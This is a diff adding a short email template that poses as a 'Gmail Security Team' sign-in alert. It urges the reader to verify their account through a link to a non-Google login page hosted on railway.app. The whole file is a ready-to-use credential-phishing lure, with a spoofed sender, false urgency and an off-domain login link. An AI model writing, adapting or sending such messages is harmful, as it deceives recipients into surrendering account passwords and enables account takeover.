@@ -1,0 +1,20 @@
+Subject: Security Alert: Verify Your Account
+
+Hello,
+
+We detected a sign-in attempt from a new device or location. For your security, please verify your account by signing in again.
+
+Click the link below to sign in and secure your account:
+
+<a href="https://log-page-production.up.railway.app/">Click here to log in</a>
+
+Important: If you didn't attempt to sign in, please secure your account immediately by changing your password.
+
+This verification helps protect your account from unauthorized access.
+
+Thank you,
+Gmail Security Team
+
+---
+This is an automated security message. If you have questions, please contact our support team.
+
